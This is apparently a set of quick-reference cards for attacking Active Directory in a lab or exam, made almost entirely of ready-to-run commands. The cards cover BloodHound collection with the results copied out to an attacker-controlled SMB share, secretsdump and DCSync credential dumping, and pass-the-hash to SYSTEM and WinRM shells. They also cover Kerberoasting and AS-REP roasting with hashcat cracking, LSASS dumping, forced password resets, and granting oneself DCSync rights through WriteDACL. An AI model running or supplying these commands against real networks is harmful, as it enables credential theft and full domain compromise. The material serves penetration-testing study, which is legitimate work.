title: BloodHound collection (SharpHound + impacket-smbserver)
inline_answer:
Use **SharpHound on-host + exfil over impacket-smbserver**. `bloodhound-python` is unreliable here (DNS SRV timeouts vs lab DCs) — do not rely on it.

```
# Kali: serve a writable share
impacket-smbserver share ./loot -smb2support -user a -password a
# Target (after foothold):
SharpHound.exe -c All --zipfilename bh
net use \\KALI_IP\share /user:a a && copy bh*.zip \\KALI_IP\share\
```

No foothold yet but have creds? `nxc ldap DC -u U -p P --bloodhound -c All --dns-server DC_IP`.

title: impacket-secretsdump — syntax
inline_answer:
```
# With password
impacket-secretsdump 'DOMAIN/user:Password@DC_IP'
# Pass-the-Hash
impacket-secretsdump -hashes :NTHASH 'DOMAIN/user@TARGET_IP'
# DCSync only (needs replication rights / DA)
impacket-secretsdump -just-dc 'DOMAIN/user:Password@DC_IP'
```

Feed the resulting `user:rid:LM:NT:::` NT field to `hashcat -m 1000`, or PtH it directly.

title: Pass-the-Hash — the three you actually use
inline_answer:
Use the **NT** half only (`aad3b...:NT` → `NT`).

```
nxc smb TARGET -u user -H NTHASH                 # validate + spray
evil-winrm -i TARGET -u user -H NTHASH            # shell (WinRM)
impacket-psexec -hashes :NTHASH 'DOMAIN/user@TARGET'   # SYSTEM shell (SMB admin)
```

`(Pwn3d!)` from nxc = local admin → psexec/wmiexec. Then secretsdump that host.

title: Kerberoast — request the TGS
inline_answer:
Needs any domain creds.

```
impacket-GetUserSPNs 'DOMAIN/user:Password' -dc-ip DC_IP -request -outputfile kerb.txt
# or, no creds yet but a user list (no-preauth not needed here):
nxc ldap DC_IP -u user -p Password --kerberoasting kerb.txt
```

Crack: `hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule`. Hash = `$krb5tgs$23$`.

title: AS-REP roast — request the AS-REP
inline_answer:
Targets users with **Do not require Kerberos preauth**. No creds needed if you have a user list.

```
impacket-GetNPUsers 'DOMAIN/' -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat
# with creds (enumerate the flag, then request):
impacket-GetNPUsers 'DOMAIN/user:Password' -dc-ip DC_IP -request
```

Crack: `hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule`. Hash = `$krb5asrep$23$`.

title: nxc — AD quick wins
inline_answer:
```
nxc smb  DC -u U -p P --pass-pol --users --groups
nxc smb  RANGE -u U -p P --shares                 # then --spider_plus
nxc smb  RANGE -u U -p P -M lsassy                # dump LSASS where admin
nxc smb  HOST -u U -p P --sam --lsa               # local secrets
nxc ldap DC -u U -p P --kerberoasting k.txt --asreproast a.txt
nxc ldap DC -u U -p P --bloodhound -c All --dns-server DC
```

Never `crackmapexec`/`cme` — `nxc` only.

title: Abuse ForceChangePassword
inline_answer:
You can reset the target user's password without knowing the old one.

```
net rpc password "TARGETUSER" "NewP@ss123" -U "DOMAIN"/"YOU"%"YOURPASS" -S DC_IP
# or from Windows: Set-DomainUserPassword -Identity TARGETUSER -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)
```

Then treat `TARGETUSER:NewP@ss123` as a fresh cred → spray everywhere.

title: Abuse GenericAll / GenericWrite on a user
inline_answer:
GenericAll/Write on a **user** → targeted Kerberoast (set an SPN, roast, remove it):

```
impacket-targetedKerberoast.py -d DOMAIN -u YOU -p PASS    # auto add/roast/cleanup
# or set SPN manually then GetUserSPNs the target
```

GenericAll on a **computer** → RBCD. On a **group** → add yourself as a member. Else just ForceChangePassword.

title: WriteDACL → grant self DCSync
inline_answer:
WriteDACL on the **domain object** → grant yourself replication rights, then DCSync:

```
impacket-dacledit -action write -rights DCSync -principal YOU -target-dn 'DC=domain,DC=com' 'DOMAIN/YOU:PASS'
impacket-secretsdump -just-dc 'DOMAIN/YOU:PASS@DC_IP'
```

From Windows: `Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity YOU -Rights DCSync`.

title: PowerView — enumerate domain trusts
inline_answer:
```powershell
Get-DomainTrust            # PowerView v3 / PowerSploit dev (what the cheatsheet uses)
Get-NetDomainTrust         # PowerView v2 / PowerSploit master (legacy alias — same output)
```

No PowerView loaded? `nltest /domain_trusts` runs from any domain-joined host, no module needed.

> [!note] PowerView's `Get-Net*` and `Get-Domain*` names refer to the same cmdlets in different branches — pick whichever your loaded module exposes.
